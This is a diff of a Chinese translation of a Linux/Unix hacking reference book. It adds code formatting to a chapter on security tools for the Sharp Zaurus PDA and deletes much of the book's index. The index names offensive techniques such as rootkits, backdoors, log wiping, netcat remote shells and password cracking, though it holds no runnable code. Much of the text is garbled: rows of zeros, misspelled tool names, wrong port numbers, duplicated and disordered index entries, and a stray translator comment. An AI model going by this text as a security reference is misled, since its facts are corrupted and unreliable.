-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|
-|0|0|0|0|0%|0.000|0.000|0.000|0.000|||||0|0|0|0|00|0.000|0.000|0.000|0.000|0.000|0|0|00000.000|0.000|0.000|0.000|
-000000000000000000000000000000000000000000000..........  。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_235_0.png)
-[/content]
 
 ## 182 第 III 部分：特别主题
 
 ## VNC SERVER
 
-VNC（远程桌面）是一种允许用户访问另一主机桌面的软件。Zaurus 端口可以在 http://sdystems.com/download 获取。经常，用户会错误地为 VNC 服务器配置弱密码。接入组织内网的入侵者可以使用 VNC 服务器主机（见图 12-1）。
+`VNC`（远程桌面）是一种允许用户访问另一主机桌面的软件。Zaurus 端口可以在 `http://sdystems.com/download` 获取。经常，用户会错误地为 `VNC` 服务器配置弱密码。接入组织内网的入侵者可以使用 `VNC` 服务器主机（见图 12-1）。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_236_0.png)
 
 ## KEYPEBBLE VNC VIEWER
 
-非常经常，用户会为 VNC 服务器配置弱密码。接入无线网络的入侵者可以使用 VNC 查看器（如下所示）。其中一种查看器 Keypebble VNC 查看器可以在 http://killefiz.de/zaurus/showdetail.php?app=186 获取。
+非常经常，用户会为 `VNC` 服务器配置弱密码。接入无线网络的入侵者可以使用 `VNC` 查看器（如下所示）。其中一种查看器 `Keypebble VNC` 查看器可以在 `http://killefiz.de/zaurus/showdetail.php?app=186` 获取。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_237_0.png)
 
 ## SMBMOUNT
 
-SMBmount 工具允许用户挂载 Samba 共享。经常，用户会为 Samba 共享配置弱密码。入侵者可以使用 SMBmount 工具访问此类共享。（有关 Samba 配置的详细信息，请参见第 4 章。）Zaurus 版本的 SMBmount 工具可以在 http://www.dasgehtnicht.de/zaurus.html 获取。
+`SMBmount` 工具允许用户挂载 Samba 共享。经常，用户会为 Samba 共享配置弱密码。入侵者可以使用 `SMBmount` 工具访问此类共享。（有关 Samba 配置的详细信息，请参见第 4 章。）Zaurus 版本的 `SMBmount` 工具可以在 `http://www.dasgehtnicht.de/zaurus.html` 获取。
 
 ## TCPDUMP
 
-Tcpdump 是一种流行的网络分析程序，可用于嗅探网段上的敏感数据。网络管理员也使用 Tcpdump 和其他网络分析程序进行故障排除。Zaurus 版本的 Tcpdump 可以在 http://www.sklogicsoftware.com/znetmeter/tcpdump_zaurus 下载。
+`Tcpdump` 是一种流行的网络分析程序，可用于嗅探网段上的敏感数据。网络管理员也使用 `Tcpdump` 和其他网络分析程序进行故障排除。Zaurus 版本的 `Tcpdump` 可以在 `http://www.sklogicsoftware.com/znetmeter/tcpdump_zaurus` 下载。
 
 ## WGET
 
-Wget 是一个使用 HTTP、HTTPS 和 FTP 协议下载文件的工具。它具有许多实用功能，包括递归下载网站文件。接入组织无线网络的入侵者可以使用 Wget 快速镜像组织的内网网站。Zaurus 默认安装了 Wget。
+`Wget` 是一个使用 HTTP、HTTPS 和 FTP 协议下载文件的工具。它具有许多实用功能，包括递归下载网站文件。接入组织无线网络的入侵者可以使用 `Wget` 快速镜像组织的内网网站。Zaurus 默认安装了 `Wget`。
 
 ## ZETHERALE
 
-Zthereal 是流行的 GUI 网络分析器 Ethereal 的移植。Zthereal 的二进制文件和截图可以在 http://www.cartel-info.fr/pbiondi/zaurus/zethereal.html 获取。关于 Ethereal 的详细信息和文档可以在 http://www.ethereal.com/ 找到。
+`Zthereal` 是流行的 GUI 网络分析器 `Ethereal` 的移植。`Zthereal` 的二进制文件和截图可以在 `http://www.cartel-info.fr/pbiondi/zaurus/zethereal.html` 获取。关于 `Ethereal` 的详细信息和文档可以在 `http://www.ethereal.com/` 找到。
 
 ## ZNESSUS
 
-zNessus 工具是 Nessus GUI 客户端的 Zaurus 版本。截图和二进制文件可以在 http://znessus.sourceforge.net/ 获取。zNessus 可用于远程配置并启动漏洞检查
-
-
-
-
+`zNessus` 工具是 `Nessus` GUI 客户端的 Zaurus 版本。截图和二进制文件可以在 `http://znessus.sourceforge.net/` 获取。`zNessus` 可用于远程配置并启动漏洞检查
 
 # 第 12 章：使用 Sharp Zaurus PDA 185 进行破解
 
-Nessus 服务器。关于 Nessus 扫描器的更多信息，请参阅第 4 章和第 11 章。
+`Nessus` 服务器。关于 `Nessus` 扫描器的更多信息，请参阅第 4 章和第 11 章。
 
-zNessus 客户端要求 Nessus 服务器配置为支持非加密通信（默认禁用）。如果你决定禁用 Nessus 服务器上的加密，请务必阻止所有流向 Nessus 端口（默认 1241）的入站流量。使用 OpenSSH 客户端连接到你的 Nessus 服务器主机，以便安全地隧道化你的 zNessus 流量。
+`zNessus` 客户端要求 `Nessus` 服务器配置为支持非加密通信（默认禁用）。如果你决定禁用 `Nessus` 服务器上的加密，请务必阻止所有流向 `Nessus` 端口（默认 `1241`）的入站流量。使用 `OpenSSH` 客户端连接到你的 `Nessus` 服务器主机，以便安全地隧道化你的 `zNessus` 流量。
 
 ### MTR
 
-MTR（Matt's TraceRoute，见下图）是一个将 `ping` 和 `traceroute` 程序的功能合并到的单一程序。（关于 ping 和 traceroute 的更多信息，请参阅第 2 章。）适用于 Zaurus 的 MTR 端口二进制程序包可以从 http://psifertex.com/zaurus/mtr_0.51_arm.ipk 下载。
+`MTR`（Matt's TraceRoute，见下图）是一个将 `ping` 和 `traceroute` 程序的功能合并到的单一程序。（关于 `ping` 和 `traceroute` 的更多信息，请参阅第 2 章。）适用于 Zaurus 的 `MTR` 端口二进制程序包可以从 `http://psifertex.com/zaurus/mtr_0.51_arm.ipk` 下载。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_239_0.png)
 
 ### DIG
 
-dig 工具可用于查询 DNS 服务器以获取如 MX 记录和服务器版本信息等内容，并执行其他 DNS 查找查询。适用于 Zaurus 的 dig 可以在 http://killefiz.de/zaurus/showdetail.php?app=362 获取。
+`dig` 工具可用于查询 DNS 服务器以获取如 MX 记录和服务器版本信息等内容，并执行其他 DNS 查找查询。适用于 Zaurus 的 `dig` 可以在 `http://killefiz.de/zaurus/showdetail.php?app=362` 获取。
 
 ### PERL
 
-许多安全工具（如 Nikto 和 Whisker 漏洞扫描器）都是使用 Perl 语言编写的。由于 Perl 是一种解释型语言，因此不需要重新编译已有的 Perl 脚本即可在 Zaurus 上运行它们。适用于 Zaurus 的 Perl 可以在 http://zaurus.frontgarden.net/perl.html 获取。
+许多安全工具（如 `Nikto` 和 `Whisker` 漏洞扫描器）都是使用 `Perl` 语言编写的。由于 `Perl` 是一种解释型语言，因此不需要重新编译已有的 `Perl` 脚本即可在 Zaurus 上运行它们。适用于 Zaurus 的 `Perl` 可以在 `http://zaurus.frontgarden.net/perl.html` 获取。
 
 ### ZAURUS 的在线资源
 
@@ -5335,861 +5619,57 @@ Zaurus PDA 在 Linux 社区中受到了极大的推崇。除了本章讨论的�
 
 ### 总结
 
-在本章中，你查看了可以在 Zaurus PDA 上使用的各种安全工具。用于执行无线网络发现、嗅探和扫描的工具现在已适用于 Zaurus。此外，像 Perl 这样的脚本语言也已移植到 Zaurus，允许用户使用 Perl 语言运行安全工具。如此庞的安全工具库的可用性结合 Linux 操作系统的灵活性，使得 Zaurus PDA 成为一个强大的工具，可用于对目标网络执行攻击和渗透测试。
+在本章中，你查看了可以在 Zaurus PDA 上使用的各种安全工具。用于执行无线网络发现、嗅探和扫描的工具现在已适用于 Zaurus。此外，像 `Perl` 这样的脚本语言也已移植到 Zaurus，允许用户使用 `Perl` 语言运行安全工具。如此庞的安全工具库的可用性结合 Linux 操作系统的灵活性，使得 Zaurus PDA 成为一个强大的工具，可用于对目标网络执行攻击和渗透测试。
 
 ### 索引
 
 符号与数字
-- PATH 环境变量中的 ""
+- `PATH` 环境变量中的 `""`
 - 利用漏洞植入木马，114–115
 - 用于主机加固的移除，132
-- #（井号），用于从 \inet 禁用 FTP，134
-- 0，将本地账户 uds 修改为，123–124
-- 127.0.0.1（环回接口），无限制
+- `#`（井号），用于从 `\inet` 禁用 FTP，134
+- `0`，将本地账户 `uds` 修改为，123–124
+- `127.0.0.1`（环回接口），无限制
 - 端口上的流量，112
-
-Netscape/Mozilla POP3 邮件
-- 句柄程序整数溢出
-- 漏洞，103–104
-- PGP4Pine 长消息行缓冲区溢出，104
-- 防止利用攻击，104
-- ARIN（美国互联网数字分配机构），Web 地址，12
-- ARP 欺骗，解释，59–60
-- ASCII（美国信息交换标准代码）表，RC 22–RC 27
-- at- 攻击
-
-A
-- 账户，移除或禁用不必要的账户，132
-- ACK 扫描，使用 Nmap 执行，30
-- 管理性弱点
-  - 在招聘职位公告中搜索，4
-  - 在 Usenet 存档中搜索，7–8
-- Adore root（获取 root 权限），下载，127
-- Airnsort 无线托管工具，使用，171, 172
-- Amap，通过其识别远程服务，36, 63
-- 天线，为无线活动选择，171
-- Apache (HTTP 和 HTTPS)，加固，139
-- Apache，针对分块处理的漏洞，85
-- NIC（亚太网络信息中心），Web 地址，12
-- 应用程序漏洞
-- BitchX 移除堆损坏，104
-- tcpdump 中畸形的 NFS 和 BGP 数据包缓冲区溢出，103
-- 弹回攻击（bounce attacks），65
-- 暴力破解，58–59
-- Web 代理上的 DoS（拒绝服务）攻击，149–150
-- 中间人攻击，60–61
-- 在 Web 代理上，102–103
-- 审计，启用，121
-- SSH 中的 authorized_keys，利用，125
-- 自动索引的漏洞，80–81
-
-B
-- 后门
-  - 使用 Loki2 安装，125–126
-  - 使用，122–126
-- 标志抓取（banner grabbing）
-  - 自动化，54–56
-  - 解释，36
-- bash_history 文件，检查内容，120–121
-- tcpdump 中 BGP 和 NFS 数据包缓冲区漏洞的发生，103
-- /bin 和文件，被...打开的，146
-- /bin 文件，分配适当的权限，147
-- /bin/ls 二进制文件，用木马替换，126
-- 二进制文件，检测修改并重命名为 name，127
-- 公司前缀，通过 RIR 记录查询，13
-- 配置文件，搜索敏感信息，7
-- 连接窃取，发生，66
-- cooks，在会话劫持中的作用，83
-- 核心转储（core dumps）的漏洞，117–118
-- 破解 /etc/shadow 文件，109–110
-- craon，示例，155
-- BIND（伯克利域名系统）
-  - 配置为禁止，138
-  - 加固，75
-  - 获取版本信息，41
-  - 适用于 Zaurus，180
-  - Bitchx 堆损坏漏洞，104
-  - 弹回攻击，发生，65
-
-D
-- 数据资源，搜索，7
-- 僵尸文件，内容，5
-- /dev 目录，权限
-- 定向天线，无线活动，171
-- 分区，149
-- 防御，59
-- 动态，58
-- HTTP（超文本传输协议）在 TCP 端口80，77
-- IMAP/IMAP 在 TCP 端口143，92
-- NNTP（新闻传输协议）在 TCP 端口109，85
-- POP2（邮局协议）在 TCP 端口11，11
-- POP3（邮局协议）在 TCP 端口21，86
-- Samba，90
-- VNC（虚拟网络计算）的漏洞，97–98
-- DNS（域名系统）的，74–75
-- DNSSEC 欺骗，74
-- 域名名称，查询，9–10
-- 域名注册后缀，查询，11
-- 域名注册记录的查询，11
-- 61
-
-C
-- Chkroot，Web 地址，127
-- chmod 命令，修改权限，114
-- CIDR（无分类域间路由）地址，RC
-- 可用磁盘空间，149–150
-- RC-30-32 解释
-- 命令历史，禁用，121
-- 加密，73
-- EDGAR（电子数据收集、分析和检索），搜索，4
-- ESSID（扩展服务标识），禁用，174
-- 审计，14
-- 缓冲区溢出原因，61
-- RPC 服务，88
-- 防止，15
-
-E
-- ettercap ARP 欺骗工具
-- 嗅探并破解密码，98–99
-- 嗅探 FTP 认证，64–65
-- 嗅探 POP3 密码，86–87
-- 使用 SSH [非官方 Sharp Zaurus SL-5500 FAQ](http://www.newbreedssoftware.com/zaurus-faq/)，60
-- FTP（文件传输协议）在 TCP 端口21 的漏洞，63
-- FTP 端口，通过 telnet 连接，37
-- FTP 服务器标志，更改并获取，37
-- EXPN 命令枚举用户，40–41
-- 关闭以使用 Sendmail，137
-- GNU Privacy Guard，73
-- 组关系和错误的文件权限，利用，112–114
-- 组所有文件，查找，112–113
-- 文件权限
-  - 为重要文件分配，147–149
-  - 磁盘分区，149
-  - 为重要文件确保，RC-30-32
-- /dev 中的文件，149
-- 被 bin 和 sys 拥有的文件，146
-- 实现 wheel组，150
-- setuid 和 setgid 文件，150
-- sudo，151
-- 教程，144-145
-- 掩码值，146–147
-- 破解工具的 Web 地址，RC-15 RC-17-handles
-- 查询域名注册记录，11
-- 查询 RIR 记录，13-14
-- 隐藏 HTML 元素的漏洞，84
-- 隐藏和后门，122-123
-- 并将本地账户 uid 修改为，0，123-124
-
-
-
-
 
 # 190 黑客技巧 Linux 与 Unix 便携参考指南
 
 ### 索引
 
-- Apache (HTTP 和 HTTPS), 139–140
-- BIND (DNS), 138–139
-  - 检查 /etc/hosts.equiv 的内容, 133
-  - 检查 .hosts 文件, 133
-  - 禁用栈执行，inet 和 linux 配置, 134–135
-- ICMP 显回请求，在 ping 扫描过程中拦截, 24
-- ident（身份识别协议）服务器，扫描, 28
-- IMAP 暴力破解，防护, 92
-- IMAP 服务器横幅标识（banners），抓取与修改, 49–50
-- IMAP 流量，嗅探, 92
-- IMAP/IMAP（互联网消息访问协议 2/4）在 TCP 端口 143 暴力破解
-  - 使用方法, 49–50
-- NFS（网络文件系统）, 141
-  - 远程服务的, 135
-  - 移除禁用不必要的账户, 132
-- Sambo, 140–141
-- Sendmail, 136
-- 设置密码策略, 132
-- SSH（安全外）TCP 端口 28–29
-  - 使用 TCP Wrappers, 133–134
-- WU-FTP, 135–136
-- hosts，ping, 22
-- Hping2，使用 Zaurus PDA 进行嗅探, 181
-- IMAPS（安全互联网消息访问协议）在 TCP 端口 999
-  - 使用方法, 52–53
-  - 使用 SSL, 94–95
-- IMAPS 服务器横幅标识，抓取与修改, 53
-- IMAPS 服务器，使用 openssl 工具, 95
-- httpd.conf 中的 Indexno 目录，使用, 139
-- HTTP 认证
-  - 暴力破解, 77
-- HTTP 状态码表, RC 28–29
-- HTTP 数据，嗅探, 78–79
-- （超文本传输协议）在 TCP 80 端口
-  - 加固, 139–140
-  - 与 HTTP 的对比, 80
-  - 使用方法, 43–45
-  - 以及会话劫持, 83–84
-  - 漏洞, 77, 92–94
-- HTTP 请求，使用 urlsnarf 程序进行嗅探, 77–78
-- HTTP 服务器横幅标识，获取与修改, 43–45
-- HTTP 服务器
-  - 当作远程 shell 使用, 122–123
-  - 经过 inet 加固, 134–135
-  - 输入验证漏洞的利用与防护, 82–83, 116
-  - 远程服务的入侵策略，概述, 58–62
-  - 连接到 openssl, 93
-  - 配置错误, 81
-  - 使用 Web 代理处理 HTTP 流量, 102–103
-- HTTPS（安全超文本传输协议）在 TCP 端口 443
-  - 加固, 139–140
-- IP 地址，使用 CIDR（无类域间路由）
-  - 类别, RC 9–11
-  - 十进制点分表示法, RC 9
-  - 长度, RC 9
-  - 以及回环地址范围, RC 12
-  - 通过查询 RR 记录, 13
-  - 使用的子网掩码, RC 11
-  - 留给私有实例的块, RC 12
-  - IP（互联网协议）头部格式, RC 12–13
-  - 使用 Nmap 进行  扫描, 30
-
-## J
-
-- 任务发布，寻找弱点, 4
-- John the Ripper，破解 /etc/shadow 文件, 109–110
-- 回环范围在 IP 划分中的作用, RC 12
-- Linux Toolkit (LRK)，下载, 127
-  - 使用 -l 标志检查权限, 144
-
-## K
-- 内核缺陷，软件漏洞, 115–116
-- 使用 Zaurus PDA 的 VNC 查看器, 183
-- 无线黑客工具, 173, 178
-- Knark rootkit，下载, 127
-- 使用 KSA（密钥调度算法）, 171
-
-## M
-- MAC 地址过滤的利用, 175
-- 使用 mailsnarf 程序嗅探 SMTP 流量, 72
-- 中间人攻击, 60–61
-  - 在 SSH（安全外）上, 68
-- msqlprite.php 脚本，示例, 96
-- 使用 PDA 的 MTR（My Traceroute）, 185
-- 域名中的 MX（邮件交换）记录，查询, 156
-- MySQL 在 TCP 端口 3306 的拦截与加固
-  - 使用方法, 53–54
-- MySQL 流量，搜索, 96–97
-- MySQL 版本信息，枚举, 54–55
-
-## L
-- LACNIC（拉丁美洲和加勒比地址注册局）, 12
-- Linux 发行版
-  - 使用命令, RC 2–6
-  - 查找文件, 154
-  - 获取补丁, 155
-- Linux 文件的数值格式, 144
-- Linux 服务中的, RC 7–8
-- 本地信任的利用, 112
-- 日志文件
-  - 在 Unix 和 Linux 中查找, 154
-  - 搜索, 5–6
-  - /var/admin/login, 155
-  - /var/admin/sug, 155
-  - /var/audit, 154
-  - /var/directory 中的, 121
-  - /var/log/cron, 155
-  - /var/log/mail 文件, 155
-  - /var/log/messages, 156
-  - /var/log/secure, 156
-  - /var/log/wtmp, 156
-  - /var/run/wtmp, 156
-  - 日志轮转，启用, 156–157
-  - 启用日志, 121, 154–157
-  - 日志机制，禁用与清理, 120–122
-- 使用 Loki 工具安装后门, 125–126
-- 回环接口 (127.0.0.1)不受限制流量, 112
-
-## N
-- NASL（Nessus 脚本语言）
-  - 特性, 162
-  -  Nessus 插件, 162–167
-- 从命令行运行 NASL 脚本, 162
-- Nessus 安全扫描器，下载与使用方法, 104–105
-- Netcat
-  - 使用获取远程 shell, 106–107
-  - 抓取横幅标识, 54–56
-- Netcat 命令列表, RC 20–21
-- Netstat，加固远程服务, 135
-- tcpdump 出现, 103
-- NFS（网络文件系统），加固, 141
-  - NFS 共享，查询远程主机, 87–88
-- 使用 NNTS, 94
-- POP3S 操作系统指纹识别, 32–34
-- Nmap 扫描工具
-  - 特性, 22
-  - 使用 ACK 扫描, 30
-  - 使用 FIN 扫描, 26
-  - 使用 FTP 弹跳扫描, 29
-  - 使用 IP 协议扫描, 30
-  - 使用系统指纹识别, 23
-  - 使用反向扫描, 28
-  - 使用 RPC（过程调用）扫描, 29–30
-  - 使用 SYN 扫描, 26
-  - 使用 TCP 建立端口扫描, 25
-  - 使用 UDP 扫描, 31
-  - 使用窗口扫描, 31
-  - 使用 XMAS 扫描, 28
-
-## P
-- Pine 长内存缓冲区溢出漏洞, 82–83
-- ping 示例, 23
-- 使用 Nmap 执行 ping 扫描, 23
-- 通过 ping 确定存活状态, 23
-- ping 流量，嗅探与 ping, 85
-- 嗅探 ping 密码, 86–87
-- 密码策略设置, 132
-- 密码资源, 81
-- 环境变量 Perl 的利用, 132
-- PHPDP Web 地址, 67
-- TCP 端口 111 上的 Portmapper
-  - 查询 NFS 共享, 87–88
-- TCP 端口 111 上的 Portmapper, 87
-- 符号（#）的, 59
-- FTP 弹跳攻击, 104
-- 密钥调度算法 (KSA), 171
-- 域名中的 MX 记录, 156
-- MySQL 在 TCP 端口 3306 的拦截与加固
-  - 使用方法, 53–54
-- MySQL 流量，搜索, 96–97
-- MySQL 版本信息，枚举, 54–55
-- 互联网协议（IP）头部格式, RC 12–13
-- 回环范围在 IP 划分中的作用, RC 12
-- 使用的子网掩码, RC 11
-- 留给私有实例的块, RC 12
-- 通过查询 RR 记录, 13
-- IP 地址，使用 CIDR（无类域间路由）
-  - 类别, RC 9–11
-  - 十进制点分表示法, RC 9
-  - 长度, RC 9
-  - 以及回环地址范围, RC 12
-
-
-
+- `Apache` (HTTP 和 HTTPS), 139–140
+- `BIND` (DNS), 138–139
 
 # 194 黑客破解版 Linux 与 Unix 安全便携参考指南
 
 通过句柄查询，13–14
 通过 IP 地址或网络块查询，13
-RRRs（区域互联网注册机构）的使用，12
-
-在 TCP 端口 513 上使用 `login` 命令，与远程主机配合，93-
-root 访问，通过 `.rhosts` 文件确保，124
-`/root` 文件，分配适当的权限，148
-获取 root 权限，123–124
-
-针对管理性缺陷的职位发布，4
-日志文件信息，5–6
-受保护的数据资源，7
-针对管理缺陷的 Usenet 存档，7–8
-Web 服务器统计数据，6–7
-安全协议，的，65
-安全会议Web 地址，RC, 19
-安全邮件列表，Web 地址，RC, 19
-
-使用 `sudo` 免费软件，151
-访问 root shell，122–103
-检测，使用，126–127
-使用 Nmap 扫描 RPC（远程过程调用），29–30
-RPC 服务
-
-安全新闻Web 资源，RC 18
-安全资源，Web 地址，RC 15
-Sendmail
-加固，136–138
-漏洞，的，73
-`sendmail.mc`，关于修改的建议，138
-对会话劫持的脆弱性，83–84
-setgid 和 setuid 文件，150
-setuid 权限，144
-由 root 拥有的 setuid/setuid shell 的利用，123
-
-查询 Portmapper，用于 46–47
-软件漏洞，的，88–89
-在 TCP 端口 514 上使用 `ssh` 命令，与远程匹配项配合，94
-RST 数据包，在 FIN 扫描中的作用，27
-`runprly` 漏洞的，116
-
-Zaurus PDAs（个人数字助手）参阅 Zaurus PDAs（数字助手）
-shell 历史，在本地语言中的作用，120–121
-shell，的，105–107
-`showmount` 程序，查询远程主机的 NSF 服务器，87–88
-SMB（服务器消息块），在 Samba 中的作用，90
-Smbunt（邮件传递代理），SMTP MDDA，183
-在加固 Sendmail 时启用，137
-SMTP 服务器横幅，抓取和更改，40
-
-# 在 TCP 端口 137 到 139 上的 Samba
-暴力破解，90
-加固，140–141
-配置错误，91
-使用，48–99
-漏洞，的，90–91
-
-Samba 密码哈希值，获取，90
-Samba 服务器信息，枚举，48
-Samba 服务器，更改字符串和版本号，49
-Samba 流量，拦截和隧道化，91
-使用 Samhain 检测被修改的二进制文件，127
-
-`/bin` 文件，分配适当的权限，148
-搜索引擎
-针对漏洞的防御，8
-使用，4
-在配置文件中搜索敏感信息，7
-EDGAR，4
-
-TCP 端口 25 上的 SMTP（邮件传输协议）
-在其上的流量嗅探，72
-使用，39–41
-SMTP 流量，嗅探，72
-嗅探防御措施，60
-嗅探，动态过程，59–60
-LDP 端口 161–162 上的 SMP（简单网络管理协议），枚举及防止枚举，50–51
-BIND（伯尔林互联网域名）的软件漏洞，75
-核心转储，117–118
-针对利用的防御，61
-示例，61
-
-# 索引 195
-
-内核缺陷，115–116
-本地缓冲区溢出，116
-OpenSSL 的，93
-RPC 服务的，88–89
-Sendmail 的，73
-符号链接，117
-telnet 的，72
-针对窃取攻击的，66
-VNC（虚拟网络计算）的，99–100
-
-`sys` 和 `bin`，被打开的文件，146
-系统审计和日志记录，启用，121
-
-Solaris FTP 核心转储恢复漏洞，发生情况的，117–118
-源代码注释，漏洞的，84–85
-源码解析，执行 Nmap 的，27
-
-# T
-`tail` 命令，检查已执行的命令，120–121
-TCP 连接端口扫描，过程，25
-TCP 劫持，发生情况的，69
-TCP ping 扫描，防止，24
-使用 Nmap 执行 TCP ping，24。另阅 pinging
-
-+ TCP 端口号，范围，25
-另阅非标准端口；UDP 端口
-- 21 (FTP), 37–38, 63
-- 22 (SSH), 37–38, 67
-- 23 (telnet), 38–39, 68
-- 25 (SMTP), 39–41, 72
-- 53 (DNS), 41–42, 74
-- 79 (Finger), 42–43
-- 80 (HTTP), 43–45, 77
-- 109 (POP2), 85
-- 110 (POP3), 45, 86
-- 111 (mapper), 45–47, 87
-- 119 (NNTP), 47–48, 89
-- 137 到 139 (Samba), 48–90, 91
-- 143 (MAP2/MAP4), 49–50
-- 512 (rewx), 93
-- 513 (rologian), 93
-- 514 (rich), 94
-- 563 (NNTPS), 52, 94
-- 993 (IMAPS), 52–53, 94
-- 995 (POP3), 53
-- 3306 (MySQL), 53–54
-- 5800+ and 5900+ (VNC), 97–100
-- 6000–6005 (X system), 100–102
-- 8000+ (web probes), 102–103
-
-SSH（安全 Shell）在 TCP 端口 22 上
-`authorized_keys`，125
-暴力破解，66–68
-加固，136
-防止 root 登录，125
-相对于登录，94
-相对于 telnet，70–72
-
-TCP SYN/半开放端口扫描，26–27
-TCP（传输控制协议）头部，格式，13
-TCP wrappers，用于加固，133–134
-畸形 NFS 和 BGP 包漏洞，103
-与 Zaurus PDAs 使用，183–184
-telnet 身份验证，嗅探，70–71
-连接 FTP 端口，37, 38
-
-# 196 关于 Linux 与安全参考
-
-telnet 在 TCP 端口 23
-暴力破解，68–69
-使用，38–99
-telnet 服务器横幅，更改，39
-获取，39
-telnet 会话，劫持，69–70
-相对于 SSH（安全 Shell），70–72
-FTP 数据，签名，55
-FTP 根目录，设置，76
-FTP（简单文件传输协议）在 UDP 端口 69 上，漏洞，75–76
-`/tmp` 文件，分配适当的权限，148
-rootkit，下载，127
-trace 请求，防止接收，19
-traceers，执行，18–19
-木马示例，126–127
-在 PATH 中植入，0–124
-环境变量，114–115
-TTL（生存时间）值，在 IDS 中的作用，发现，146–147
-url 程序，嗅探，与，77–78
-
-UDP 头部，格式，14
-UDP 端口号，范围，25
-使用 Nmap 执行 UDP 扫描，31
-UDP 端口。另阅非标准端口；TCP 端口
-- 53 (DNS), 41–42, 74
-- 69 (TFTP), 75–76
-- 137 到 139 (Samba), 48–90, 91
-- 161–162 (SNMP), 50–51
-
-Unix 发行版，用于 RC 2–8
-Unix 文件系统，表示，144
-Unix 服务，使用的端口，RC 7–8
-user，123–124
-`/var/adm/login` 文件，的，155
-`/var/adm/audit` 文件，的，154–155
-`/var` 目录空间检查，157
-清理，121–122
-`/var` 文件，分配适当的权限，148–149
-`/var/log` 文件，的，155
-`/var/message` 文件，的，155
-`/var/log/secure` 文件，的，156
-`/var/log/utm` 文件，的，156
-`/var/run/utm` 文件，的，156
-
-虚拟机，测试利用的，62
-VNC 密码，嗅探和破解，88–99
-VNC 服务器，与 Zaurus PDAs 使用，182
-VNC 流量，通过 SSH 安全隧道化，99–100
-VNC（虚拟网络计算）在 TCP 端口 5800 和 5900+，配置错误，99
-漏洞，的，97–100
-vncrack 工具，Web 地址，97
-通过以下方式枚举用户，40–41
-关闭使用，Sendmail，137
-应用程序漏洞，103–104
-对 Netscape/Mozilla POP3 邮件的拦截，在，103–104
-哪些查询的，9
-w（写）权限，示例，144
-Web 应用程序，漏洞的，82–83
-TCP 端口 8000+ 上的 Web 探测，配置错误，102–103
-安全新闻Web 资源，列表，RC 18
-Web 服务器配置敏感文件，81–82
-搜索统计数据，6–7
-
-# 索引 197
-
-ore rootkit，127
-Airsnort，171–172
-Amap，36, 63
-无线活动天线，171
-Apache 处理漏洞，85
-APNIC（亚太网络中心），12
-ARIN（美国互联网注册机构），12
-BIND 在环境中的运行，138
-Bing，180
-CDE Toolkit 漏洞，117
-Chkrootkit，127
-用于 Zaurus 的 dig 工具，185
-DNSSEC（DNS 安全），74–75
-EDGAR，4
-Ettercap ARP 欺骗工具，60
-`/var/audit` 文件的事件日志，155
-Finger 漏洞，43
-GNU Privacy Guard，73
-黑客工具，RC 15
-Hping2，171
-Hydra 暴力破解工具，58
-John the Ripper，109–110
-VNC 查看器，183
-Kismet，178
-Kismet 无线攻击工具，73
-rootkit，127
-LACNIC（拉丁美加勒比互联网注册），12
-本地缓冲区溢出，116
-Loki 工具，127
-LRK（Rootkit），127
-针对 SSH 的中间人攻击，68
-MySQL 加固，95
-NASL 参考手册，106
-Nessus，105
-Netcat，54–56
-nmap 工具，22
-nnpasswd，59
-nnpasswd 工具，110
-OpenSSL，181
-OpenSSL，93–94
-Linux 与 Unix 补丁，155
-PHPnuke 漏洞，82
-ProFTPD，67
-Qmap，179–180
-RFC 768（UDP 头部），RC 14（注：原文为768可能为误）此处修正为：RFC 768（UDP 头部），RC 14
-RFC 791（IP 头部），RC 12
-RFC 793（TCP 头部），RC 13
-RIPE NCC（欧洲网络协调中心），12
-RFC 软件漏洞，88
-runpr 工具，116
-Samhain，127
-安全会议，RC 19
-安全邮件列表，Web 地址，RC 19
-安全资源，RC 15
-Sendmail，73
-Smbmount 用于 Zaurus PDAs 的，183
-软件漏洞和缓冲区溢出，61
-SSH 用于 VNC 流量，99–100
-Sudo，151
-TCP Wrappers，133
-tcpdump 和畸形 NFS 包，103
-tcpdump 用于 Zaurus PDAs 的，184
-Tornkit rootkit，127
-Tripwire，127
-Usenet 存档针对管理缺陷，8
-虚拟机软件，62
-VNC 服务器，182
-vncrack 工具，97
-无线天线，171
-WU-FTPDP，135
-xkey 工具，102
-xprobe，32–34
-xmore 工具，102
-xxscan 程序，101
-zap3 工具，121
-Zaurus PDAs，185
-Zaurus 版 nmap，179
-Zedee 命令行，107–109
-Zeereal 用于 Zaurus PDAs，184
-Zness 用于 Zaurus PDAs，184–185
-
-
-
-
+`RRRs`（区域互联网注册机构）的使用，12
 
 # 198 HackNodes Linux 和 Unix 安全便携参考指南
 
--   wheel 组，限制许多用户对 setuid 程序的访问，150
--   who 查询，漏洞相关，9
--   窗口扫描，使用 Nmap 执行，31
--   无线攻击，针对天线，其发生情况，171
--   xremote 工具，下载，102
--   xscan 命令，配合 X 服务器使用，101
--   xterm 获取远程 shell，配合特定方法使用，107
--   watchchwin 工具，下载，101
-
-# Z
-
-+ 无线攻击工具
-  -   Airsnort, 172
-  -   Fata-Jack, 173-174
-  -   Kismet, 173
-  -   无线网络
-    - 加固，174-175
-    - 漏洞，170
-- 世界可读文件
-  -   审计，145
-  -   查找，113-114
-- 世界可写文件，搜索，113-114, 146
-- WU-FTPTP
-  -   加固，135-136
-  -   漏洞，66–67
-+ zap3 工具，清理，配合使用，121
-- Zaurus PDAs（个人数字助设备）
-  -   配合 Bing 使用，180
-  -   配合 dig 工具使用，185
-  -   特征，178
-  -   配合 Hping2 使用，181
-  -   配合 Keypebble VNC 视器使用，183
-  -   配合 Kismet 使用，178
-  -   配合 MTR (Matt's TraceRoute) 使用，185
-  -   配合 Nmap 使用，179
-  -   在线资源，185
-  -   配合 OpenSSH 使用，180–181
-  -   Perl, 185
-  -   配合 Qpenmappe 使用，179–180
-  -   配合 Smbmound 使用，183
-  -   配合 tcpdump 使用，183-184
-  -   配合 VNC server 使用，182
-  -   配合 Wellenreiter II 使用，179
-  -   配合 Wget 使用，184
-  -   配合 ZEthereal 使用，184
-  -   配合 Znesus 使用，184
